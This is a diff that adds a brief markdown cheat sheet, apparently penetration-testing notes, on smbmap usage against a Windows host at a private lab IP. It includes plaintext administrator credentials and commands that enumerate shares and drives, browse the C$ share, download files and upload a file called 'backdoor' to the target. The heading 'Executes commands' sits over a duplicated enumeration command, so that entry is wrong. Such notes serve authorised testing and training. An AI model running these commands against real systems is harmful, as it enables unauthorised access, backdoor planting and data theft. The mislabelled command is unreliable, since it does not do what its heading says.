@@ -1,0 +1,25 @@
+### SMB MAP Enum
+
+##### Enum shares with smbMap
+
+> `smbmap -u administrator -p smbserver_771 -d . -H 10.0.28.123`
+
+##### Executes commands with smbMap
+
+> `smbmap -u administrator -p smbserver_771 -d . -H 10.0.28.123`
+
+##### Listing all drives on the specified host
+
+> `smbmap -H 10.0.28.123 -u Administrator -p 'smbserver_771' -L`
+
+###### List contents of the directory of  C:\  drive
+
+> `smbmap -H 10.0.28.123 -u Admin -p 'smb' -r 'C$'`
+
+###### Uploading a file
+
+> `smbmap -H 10.0.28.123 -u Admin -p 'smbserver' --upload '/root/backdoor'  'C$\backdoor'`
+
+###### Download a file
+
+> `smbmap -H 10.0.28.123 -u Administrator -p 'smbserver_771' --download  'C$\file.txt'`
